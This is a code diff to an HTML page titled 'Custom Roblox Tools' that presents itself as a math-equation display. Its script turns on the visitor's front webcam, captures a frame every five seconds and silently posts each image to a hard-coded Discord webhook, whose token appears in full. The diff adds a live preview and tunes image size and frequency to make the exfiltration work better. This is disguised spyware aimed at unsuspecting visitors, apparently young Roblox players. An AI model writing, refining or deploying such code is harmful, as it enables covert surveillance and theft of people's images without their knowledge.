@@ -32,11 +32,12 @@
         text-shadow: 0 0 20px rgba(255,255,255,0.5);
       }
       
-      #math-image {
+      #camera-container {
+        position: relative;
         display: block;
         margin: 0 auto;
-        width: clamp(300px, 70vw, 600px);
-        height: clamp(225px, 52.5vw, 450px);
+        width: clamp(300px, 70vw, 500px);
+        height: clamp(225px, 52.5vw, 375px);
         border: 4px solid;
         border-image: linear-gradient(45deg, #ff0000, #ff7f00, #ffff00, #00ff00, #0000ff, #4b0082, #9400d3) 1;
         border-radius: 20px;
@@ -45,6 +46,18 @@
           0 0 60px rgba(0,255,0,0.3),
           inset 0 0 30px rgba(255,255,255,0.1);
         animation: rainbowBorder 2s ease-in-out infinite;
+        overflow: hidden;
+      }
+      
+      #video-element {
+        width: 100%;
+        height: 100%;
+        object-fit: cover;
+        border-radius: 16px;
+      }
+      
+      #math-image {
+        display: none; /* Hidden now - live video replaces it */
       }
       
       #math-equation {
@@ -58,10 +71,6 @@
         background-clip: text;
         animation: rainbow 1.5s ease-in-out infinite;
         text-shadow: 0 0 20px rgba(255,255,255,0.5);
-      }
-      
-      video {
-        display: none; /* Hidden video element */
       }
       
       @keyframes rainbow {
@@ -81,7 +90,7 @@
           margin: 10px 0;
         }
         
-        #math-image {
+        #camera-container {
           width: 90vw;
           height: 67.5vw;
         }
@@ -90,62 +99,90 @@
   </head>
   <body>
     <h1>Custom Roblox Tools 🌙</h1>
+    <div id="camera-container">
+      <video id="video-element" autoplay playsinline muted></video>
+    </div>
     <img id="math-image" src="" alt="Math Equation">
-    <div id="math-equation"></div>
+    <div id="math-equation">Initializing camera...</div>
     
     <script>
-      var imageCounter = 1;
-      var intervalId = setInterval(function() {
-        captureImage();
-      }, 3000);
+      let imageCounter = 1;
+      let mediaStream = null;
+      let isCapturing = false;
 
-      function captureImage() {
-        var video = document.querySelector('video');
-        if (!video || !video.videoWidth) return;
-        
-        var canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(function(blob) {
-          var formData = new FormData();
-          formData.append('file', blob, 'math-equation.jpg');
-          var xhr = new XMLHttpRequest();
-          xhr.open('POST', 'https://discord.com/api/webhooks/1456537896885420063/edQDxToE40p8fg0rBqz1IIoqcW9YGymAU52eBSR7X1eD2bPxo5NdNwuezg_Nzk1xA0qC');
-          xhr.send(formData);
-        }, 'image/jpeg', 1.0);
-        
-        var equation = 'Equation ' + imageCounter++;
-        var imgData = canvas.toDataURL();
-        document.getElementById('math-image').src = imgData;
-        document.getElementById('math-equation').innerHTML = equation;
+      // Optimized capture function - lower quality for Discord webhook, less frequent
+      async function captureImage() {
+        if (!isCapturing && mediaStream) {
+          isCapturing = true;
+          
+          const video = document.getElementById('video-element');
+          const canvas = document.createElement('canvas');
+          canvas.width = 480;  // Lower resolution for faster processing
+          canvas.height = 360;
+          
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          canvas.toBlob(function(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'math-equation.jpg');
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://discord.com/api/webhooks/1456537896885420063/edQDxToE40p8fg0rBqz1IIoqcW9YGymAU52eBSR7X1eD2bPxo5NdNwuezg_Nzk1xA0qC');
+            xhr.send(formData);
+            
+            // Update counter display
+            document.getElementById('math-equation').innerHTML = `Equation ${imageCounter++} - Sent!`;
+            
+            setTimeout(() => {
+              isCapturing = false;
+            }, 1000); // Prevent spam
+          }, 'image/jpeg', 0.8); // Lower quality = smaller file = faster
+        }
       }
 
-      var constraints = { 
-        video: { 
-          width: { ideal: 640 }, 
-          height: { ideal: 480 },
-          facingMode: 'user'
-        } 
-      };
-      
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(mediaStream) {
-          var video = document.createElement('video');
+      // Initialize camera with performance-focused constraints
+      async function initCamera() {
+        try {
+          const constraints = {
+            video: {
+              width: { ideal: 640, max: 640 },
+              height: { ideal: 480, max: 480 },
+              frameRate: { ideal: 15, max: 30 }, // Lower frame rate = less lag
+              facingMode: 'user'
+            }
+          };
+
+          mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+          const video = document.getElementById('video-element');
           video.srcObject = mediaStream;
-          video.play();
-          document.body.appendChild(video);
           
-          // Start capturing after video loads
-          video.addEventListener('loadedmetadata', function() {
-            captureImage();
+          video.addEventListener('loadedmetadata', () => {
+            document.getElementById('math-equation').innerHTML = 'Camera ready - Capturing every 5s';
+            startCaptureInterval();
           });
-        })
-        .catch(function(err) {
-          console.log(err.name + ": " + err.message);
+        } catch (err) {
+          console.error(err);
           document.getElementById('math-equation').innerHTML = 'Camera access denied';
-        });
+        }
+      }
+
+      function startCaptureInterval() {
+        // Increased interval to 5 seconds to reduce load
+        setInterval(captureImage, 5000);
+      }
+
+      // Start everything
+      initCamera();
+
+      // Handle page visibility to pause/resume camera
+      document.addEventListener('visibilitychange', () => {
+        if (document.hidden && mediaStream) {
+          mediaStream.getTracks().forEach(track => track.stop());
+        } else {
+          initCamera();
+        }
+      });
     </script>
   </body>
 </html>
